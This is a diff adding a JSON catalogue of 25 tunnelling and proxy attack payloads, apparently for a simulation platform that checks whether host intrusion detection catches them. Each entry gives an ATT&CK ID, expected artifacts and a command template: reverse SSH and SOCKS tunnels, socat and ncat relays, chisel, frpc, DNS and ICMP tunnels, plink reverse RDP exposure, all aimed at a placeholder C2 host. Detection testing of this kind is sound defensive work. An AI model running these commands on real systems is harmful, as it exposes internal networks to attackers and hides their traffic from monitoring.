@@ -1,0 +1,957 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ssh -L local",
+    "payload_external_id": "HIDS-TUNNELPROXY-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ssh -L 本地端口转发到内网服务。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ssh -N -L 0.0.0.0:{{LOCAL_PORT}}:{{INTERNAL_HOST}}:{{INTERNAL_PORT}} user@{{C2_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ssh",
+      "listen_local:{{LOCAL_PORT}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ssh -R reverse",
+    "payload_external_id": "HIDS-TUNNELPROXY-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ssh -R 反向 SOCKS 把内网暴露给 C2。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ssh -N -R {{C2_PORT}}:127.0.0.1:22 user@{{C2_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ssh",
+      "tcp_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ssh -D dynamic",
+    "payload_external_id": "HIDS-TUNNELPROXY-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ssh -D SOCKS5 动态端口转发。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1090.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ssh -N -D 0.0.0.0:1080 user@{{C2_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ssh",
+      "listen_local:1080"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: autossh persist",
+    "payload_external_id": "HIDS-TUNNELPROXY-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "autossh 保持反向 SSH 隧道存活（断线重连）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "autossh -M 0 -fNR {{C2_PORT}}:127.0.0.1:22 user@{{C2_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:autossh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ncat tunnel",
+    "payload_external_id": "HIDS-TUNNELPROXY-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ncat 直接做端口对端口转发。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1090"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ncat -lk 8888 -c 'ncat {{C2_HOST}} {{C2_PORT}}'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ncat"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: socat tcp pipe",
+    "payload_external_id": "HIDS-TUNNELPROXY-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "socat TCP-LISTEN ↔ TCP 中继。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1090"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "socat TCP-LISTEN:8888,fork,reuseaddr TCP:{{C2_HOST}}:{{C2_PORT}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:socat"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: chisel client",
+    "payload_external_id": "HIDS-TUNNELPROXY-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "chisel HTTP/WS 隧道客户端。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "chisel client {{C2_HOST}}:{{C2_PORT}} R:1080:socks",
+    "hids_artifact_path": "chisel",
+    "hids_expected_artifacts": [
+      "proc:chisel",
+      "ws_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: frpc client",
+    "payload_external_id": "HIDS-TUNNELPROXY-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "frpc 反向代理客户端（最常用内网穿透工具）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "frpc -c /tmp/frpc.ini",
+    "hids_artifact_path": "/tmp/frpc.ini",
+    "hids_expected_artifacts": [
+      "proc:frpc",
+      "file_create:/tmp/frpc.ini"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ngrok tcp",
+    "payload_external_id": "HIDS-TUNNELPROXY-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ngrok TCP 隧道。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "ngrok tcp 22",
+    "hids_artifact_path": "ngrok",
+    "hids_expected_artifacts": [
+      "proc:ngrok"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: stowaway agent",
+    "payload_external_id": "HIDS-TUNNELPROXY-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "stowaway 多级代理 agent。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "stowaway_agent -c {{C2_HOST}}:{{C2_PORT}} -s {{SECRET}} --reconnect 5",
+    "hids_artifact_path": "stowaway_agent",
+    "hids_expected_artifacts": [
+      "proc:stowaway_agent"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: gost socks",
+    "payload_external_id": "HIDS-TUNNELPROXY-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "gost SOCKS5 over TLS 隧道。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1090.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "gost -L socks5://:1080 -F tls://{{C2_HOST}}:{{C2_PORT}}",
+    "hids_artifact_path": "gost",
+    "hids_expected_artifacts": [
+      "proc:gost",
+      "tls_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: rakshasa",
+    "payload_external_id": "HIDS-TUNNELPROXY-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Rakshasa BIOS firmware level tunnel implant (示意).",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1542.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "rakshasa_loader",
+    "hids_artifact_path": "rakshasa_loader",
+    "hids_expected_artifacts": [
+      "proc:rakshasa_loader"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: cloudflared",
+    "payload_external_id": "HIDS-TUNNELPROXY-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Cloudflare argo tunnel 把内网服务暴露到 Cloudflare 边缘。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1567"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "cloudflared tunnel --hostname x.example.org --url localhost:80",
+    "hids_artifact_path": "cloudflared",
+    "hids_expected_artifacts": [
+      "proc:cloudflared",
+      "tls_outbound:argotunnel.com"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: dns2tcp",
+    "payload_external_id": "HIDS-TUNNELPROXY-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "dns2tcp 经 DNS 封装 TCP 隧道。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1071.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "dns2tcpc -k {{KEY}} -z tunnel.{{C2_DOMAIN}} -r ssh -l 2222 {{DNS_SERVER}}",
+    "hids_artifact_path": "dns2tcpc",
+    "hids_expected_artifacts": [
+      "proc:dns2tcpc",
+      "dns_query:tunnel.{{C2_DOMAIN}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: iodine dns",
+    "payload_external_id": "HIDS-TUNNELPROXY-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "iodine 通过 NULL/TXT 记录建立 IP-over-DNS 隧道。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1071.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "iodine -P {{PASSWORD}} tunnel.{{C2_DOMAIN}}",
+    "hids_artifact_path": "iodine",
+    "hids_expected_artifacts": [
+      "proc:iodine",
+      "dns_query:tunnel.{{C2_DOMAIN}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: dnscat2",
+    "payload_external_id": "HIDS-TUNNELPROXY-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "dnscat2 客户端经 DNS 与 C2 交互。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1071.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "dnscat tunnel.{{C2_DOMAIN}}",
+    "hids_artifact_path": "dnscat",
+    "hids_expected_artifacts": [
+      "proc:dnscat",
+      "dns_query:tunnel.{{C2_DOMAIN}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: icmptunnel",
+    "payload_external_id": "HIDS-TUNNELPROXY-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "icmptunnel 经 ICMP echo 携带 TCP 数据。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1095"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "icmptunnel -c {{C2_HOST}}",
+    "hids_artifact_path": "icmptunnel",
+    "hids_expected_artifacts": [
+      "proc:icmptunnel",
+      "icmp_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: hans icmp",
+    "payload_external_id": "HIDS-TUNNELPROXY-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "hans 基于 ICMP 的 IP-over-ICMP VPN。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1095"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hans -c {{C2_HOST}} -p {{PASSWORD}}",
+    "hids_artifact_path": "hans",
+    "hids_expected_artifacts": [
+      "proc:hans"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: 3proxy",
+    "payload_external_id": "HIDS-TUNNELPROXY-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "3proxy 轻量化 SOCKS/HTTP 代理。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1090"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "3proxy 3proxy.cfg",
+    "hids_artifact_path": "3proxy",
+    "hids_expected_artifacts": [
+      "proc:3proxy"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: v2ray vmess",
+    "payload_external_id": "HIDS-TUNNELPROXY-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "v2ray vmess 加密代理客户端（隐蔽 C2）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1573.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "v2ray run -config v2.json",
+    "hids_artifact_path": "v2ray",
+    "hids_expected_artifacts": [
+      "proc:v2ray",
+      "tls_outbound"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: trojan-go",
+    "payload_external_id": "HIDS-TUNNELPROXY-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "trojan-go TLS 流量伪装代理。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1573.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "trojan-go -config trojan.yml",
+    "hids_artifact_path": "trojan-go",
+    "hids_expected_artifacts": [
+      "proc:trojan-go",
+      "tls_outbound"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: rapture pivot",
+    "payload_external_id": "HIDS-TUNNELPROXY-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Sliver implant pivot to next hop。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "sliver pivot tcp --bind {{LOCAL_PORT}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:sliver_implant"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: plink reverse",
+    "payload_external_id": "HIDS-TUNNELPROXY-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Putty plink.exe Windows 端反向 SSH 隧道。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "plink.exe -ssh -l user -pw pass -R {{C2_PORT}}:127.0.0.1:3389 {{C2_HOST}}",
+    "hids_artifact_path": "plink.exe",
+    "hids_expected_artifacts": [
+      "proc:plink.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: netsh portproxy",
+    "payload_external_id": "HIDS-TUNNELPROXY-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Windows netsh interface portproxy 端口转发。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1572"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "netsh interface portproxy add v4tov4 listenport={{LOCAL_PORT}} connectaddress={{C2_HOST}} connectport={{C2_PORT}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:netsh.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Tunnel Proxy: ssh ProxyJump",
+    "payload_external_id": "HIDS-TUNNELPROXY-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ssh -J jump 多跳隧道（合法形态做横向移动）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1021.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "tunnel_proxy"
+    ],
+    "hids_category": "tunnel_proxy",
+    "hids_execution_mode": "command",
+    "hids_command_template": "ssh -J jump1@{{HOP1}},jump2@{{HOP2}} target@{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ssh"
+    ]
+  }
+]
